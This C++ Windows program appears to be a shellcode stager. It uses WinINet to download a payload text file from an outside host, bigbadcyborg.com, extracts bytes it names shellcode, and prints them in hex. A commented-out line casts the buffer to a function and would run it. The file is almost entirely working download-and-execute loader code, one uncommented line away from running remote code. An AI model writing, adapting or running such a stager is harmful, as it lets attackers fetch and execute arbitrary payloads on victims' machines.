//To compile: g++ test.cpp -o test -lwininet
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wininet.h>

unsigned char* processFileContents(const char *url, size_t *outLen) {
    HINTERNET hInternet, hConnect;
    DWORD bytesRead;
    unsigned char buffer[4096];
    unsigned char *content = NULL;
    size_t contentLen = 0;

    hInternet = InternetOpen("WinINet Example", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) {
        fprintf(stderr, "InternetOpen failed with error %lu\n", GetLastError());
        return NULL;
    }

    hConnect = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        fprintf(stderr, "InternetOpenUrl failed with error %lu\n", GetLastError());
        InternetCloseHandle(hInternet);
        return NULL;
    }

    // Read the contents
    do {
        if (!InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead)) {
            fprintf(stderr, "InternetReadFile failed with error %lu\n", GetLastError());
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return NULL;
        }

        unsigned char *newContent = (unsigned char *)realloc(content, contentLen + bytesRead);
        if (!newContent) {
            fprintf(stderr, "Realloc failed\n");
            free(content);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return NULL;
        }

        content = newContent;
        memcpy(content + contentLen, buffer, bytesRead);
        contentLen += bytesRead;
    } while (bytesRead > 0);

    // Find the first newline character
    unsigned char *start = (unsigned char *)memchr(content, '\n', contentLen);
    if (start) {
        start++;  // Skip the newline character

        // Find the last semicolon and skip it
        unsigned char *end = (unsigned char *)strrchr((const char *)start, ';');
        if (end && end > start) {
            *end = '\0';
        }

        // Calculate the new length
        *outLen = strlen((const char *)start);

        unsigned char *shellcode = (unsigned char *)malloc(*outLen * sizeof(unsigned char));
        if (shellcode) {
            memcpy(shellcode, start, *outLen);
        }

        free(content);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);

        return shellcode;
    } else {
        free(content);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return NULL;
    }
}

int main() {
    const char *url = "http://bigbadcyborg.com/payload-22.txt";
    size_t shellcodeLen;
    unsigned char *shellcode = processFileContents(url, &shellcodeLen);

    if (shellcode) {
        // Print the shellcode exactly
        for (size_t i = 0; i < shellcodeLen; i++) {
            printf("%02x", shellcode[i]);
        }
        printf("\n");

        // Execute the shellcode
        //((void(*)())shellcode)();

        free(shellcode);
    }

    return 0;
}
